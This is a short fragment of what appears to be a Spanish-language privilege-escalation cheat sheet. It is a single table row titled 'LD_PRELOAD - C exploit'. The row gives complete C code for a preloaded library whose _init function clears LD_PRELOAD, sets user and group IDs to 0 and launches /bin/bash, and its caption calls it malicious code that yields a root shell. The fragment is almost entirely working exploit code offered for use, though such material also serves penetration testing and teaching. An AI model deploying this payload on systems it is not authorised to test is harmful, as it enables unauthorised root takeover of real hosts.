...
| **LD_PRELOAD - C exploit** | `c<br>#include <stdio.h><br>#include <sys/types.h><br>#include <stdlib.h><br><br>void _init() {<br> unsetenv("LD_PRELOAD");<br> setgid(0);<br> setuid(0);<br> system("/bin/bash");<br>}` | Código malicioso que da shell como root |
